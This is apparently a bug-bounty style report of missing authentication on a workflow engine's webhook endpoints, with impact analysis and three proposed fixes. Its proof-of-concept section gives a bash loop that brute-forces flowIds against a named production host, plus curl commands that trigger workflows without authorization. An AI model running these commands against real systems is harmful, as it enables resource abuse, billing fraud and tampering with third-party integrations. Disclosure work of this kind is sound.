# 🔴 CRITICAL: Authentication Bypass on Webhook Endpoints Allows Unauthorized Workflow Execution

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Severity** | Critical (CVSS 3.1: 9.1) |
| **Vulnerability Type** | CWE-306: Missing Authentication for Critical Function |
| **Affected Component** | `workflow/packages/backend/api/src/app/webhooks/webhook-controller.ts` |
| **Attack Vector** | Network (Remote) |
| **Privileges Required** | None |
| **User Interaction** | None |

---

## 🔍 Vulnerability Description

All webhook endpoints in the workflow engine are configured with `skipAuth: true`, allowing any unauthenticated user to trigger workflow execution if they know or can enumerate valid `flowId` values. This enables unauthorized consumption of compute resources, execution of potentially sensitive automation workflows, and abuse of connected third-party integrations.

### Vulnerable Code Location
**File:** `workflow/packages/backend/api/src/app/webhooks/webhook-controller.ts`  
**Lines:** 108-120

```typescript
const WEBHOOK_PARAMS = {
    config: {
        allowedPrincipals: ALL_PRINCIPAL_TYPES,
        skipAuth: true,   // ⚠️ CRITICAL: No authentication required
        rawBody: true,
    },
    schema: {
        params: WebhookUrlParams,
    },
}
```

### Affected Endpoints:
| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/:flowId/sync` | ALL | Synchronous webhook execution |
| `/:flowId` | ALL | Asynchronous webhook execution |
| `/:flowId/draft/sync` | ALL | Execute draft flow version (sync) |
| `/:flowId/draft` | ALL | Execute draft flow version (async) |
| `/:flowId/test` | ALL | Test webhook execution |

---

## 🧠 Impact Assessment

**Confidentiality:** MEDIUM - Workflow outputs may contain sensitive data  
**Integrity:** HIGH - Attackers can trigger workflows that modify external systems  
**Availability:** HIGH - Resource exhaustion through mass workflow triggering

### Attack Scenarios:

1. **Resource Exhaustion (DoS)**
   - Attacker triggers expensive workflows repeatedly
   - Consumes compute credits, API quotas, and server resources

2. **Billing Fraud**
   - Trigger AI model inference workflows
   - Consume victim's API tokens for OpenAI, Claude, etc.

3. **Third-Party API Abuse**
   - Execute workflows with connected integrations (Slack, Email, SMS)
   - Send spam or phishing messages through victim's accounts

4. **Data Manipulation**
   - Trigger workflows that write to databases or external services
   - Corrupt or manipulate business data

5. **Workflow Enumeration**
   - Brute-force flowId values to discover active workflows
   - Map organization's automation infrastructure

---

## 📸 Proof of Concept

### Step 1: Enumerate valid flowIds
```bash
#!/bin/bash
# FlowIds follow the pattern: [a-zA-Z0-9]{21}
# Brute force or use timing attacks to identify valid flows

BASE_URL="https://webhook.aixblock.io"

# Test known flowId patterns
for id in $(cat wordlist.txt); do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/$id")
    if [ "$response" != "404" ] && [ "$response" != "410" ]; then
        echo "FOUND: $id (HTTP $response)"
    fi
done
```

### Step 2: Trigger unauthorized workflow execution
```bash
# No authentication required - execute any discovered workflow
curl -X POST "https://webhook.aixblock.io/DISCOVERED_FLOW_ID" \
  -H "Content-Type: application/json" \
  -d '{"trigger": "unauthorized", "payload": "malicious_data"}'

# Response: HTTP 200 - Workflow executed successfully
```

### Step 3: Execute draft versions (potentially untested code)
```bash
# Draft endpoints allow executing unpublished flow versions
curl -X POST "https://webhook.aixblock.io/FLOW_ID/draft" \
  -H "Content-Type: application/json" \
  -d '{"execute": "draft_version"}'
```

### Step 4: Synchronous execution for immediate data extraction
```bash
# Sync endpoint waits for execution and returns results
curl -X POST "https://webhook.aixblock.io/FLOW_ID/sync" \
  -H "Content-Type: application/json" \
  -d '{"extract": "sensitive_data"}' \
  --max-time 30

# Response may contain workflow output with sensitive data
```

---

## ✅ Proposed Fix

Implement webhook signature validation and optional authentication:

### Option 1: HMAC Signature Validation (Recommended)

```typescript
// webhook-controller.ts

import { createHmac, timingSafeEqual } from 'crypto';

const WEBHOOK_PARAMS = {
    config: {
        allowedPrincipals: ALL_PRINCIPAL_TYPES,
        skipAuth: true,  // Keep public access but validate signatures
        rawBody: true,
    },
    schema: {
        params: WebhookUrlParams,
        headers: Type.Object({
            'x-webhook-signature': Type.Optional(Type.String()),
            'x-webhook-timestamp': Type.Optional(Type.String()),
        }),
    },
}

// Add pre-handler hook for signature validation
app.addHook('preHandler', async (request, reply) => {
    const flow = await flowService(request.log).getOneById(request.params.flowId);
    
    if (!flow) {
        return; // Will return 404/410 in main handler
    }
    
    // Check if webhook authentication is enabled for this flow
    if (flow.settings?.webhookAuth?.enabled) {
        const signature = request.headers['x-webhook-signature'];
        const timestamp = request.headers['x-webhook-timestamp'];
        
        if (!signature || !timestamp) {
            return reply.code(401).send({ 
                error: 'Missing webhook signature headers' 
            });
        }
        
        // Prevent replay attacks (5 minute window)
        const timestampAge = Date.now() - parseInt(timestamp);
        if (timestampAge > 300000 || timestampAge < 0) {
            return reply.code(401).send({ 
                error: 'Webhook timestamp expired' 
            });
        }
        
        // Validate HMAC signature
        const expectedSignature = createHmac('sha256', flow.settings.webhookAuth.secret)
            .update(`${timestamp}.${request.rawBody}`)
            .digest('hex');
        
        const signatureBuffer = Buffer.from(signature, 'hex');
        const expectedBuffer = Buffer.from(expectedSignature, 'hex');
        
        if (signatureBuffer.length !== expectedBuffer.length || 
            !timingSafeEqual(signatureBuffer, expectedBuffer)) {
            return reply.code(401).send({ 
                error: 'Invalid webhook signature' 
            });
        }
    }
});
```

### Option 2: Rate Limiting (Minimum Mitigation)

```typescript
// Add rate limiting to prevent abuse
import rateLimit from '@fastify/rate-limit';

await app.register(rateLimit, {
    max: 100,
    timeWindow: '1 minute',
    keyGenerator: (request) => {
        // Rate limit per flowId + IP combination
        return `${request.params.flowId}:${request.ip}`;
    },
    errorResponseBuilder: () => ({
        error: 'Rate limit exceeded for this webhook'
    })
});
```

### Option 3: Flow-Level Access Control

```typescript
// Add visibility settings to flow schema
// flow.settings.webhookAccess: 'public' | 'authenticated' | 'signed'

app.addHook('preHandler', async (request, reply) => {
    const flow = await flowService(request.log).getOneById(request.params.flowId);
    
    if (flow?.settings?.webhookAccess === 'authenticated') {
        // Require bearer token for authenticated webhooks
        const authHeader = request.headers.authorization;
        if (!authHeader?.startsWith('Bearer ')) {
            return reply.code(401).send({ error: 'Authentication required' });
        }
        // Validate token...
    }
});
```

---

## 🔗 References

- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [OWASP API Security - Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
- [Webhook Security Best Practices](https://webhooks.fyi/security/hmac)

---

## 📋 Checklist

- [x] Repository starred
- [x] Repository forked
- [x] Vulnerability verified in codebase
- [x] Impact assessment provided
- [x] PoC outline included
- [x] Fix proposal included (3 options)

---

**Reported by:** Security Researcher  
**Date:** December 28, 2025
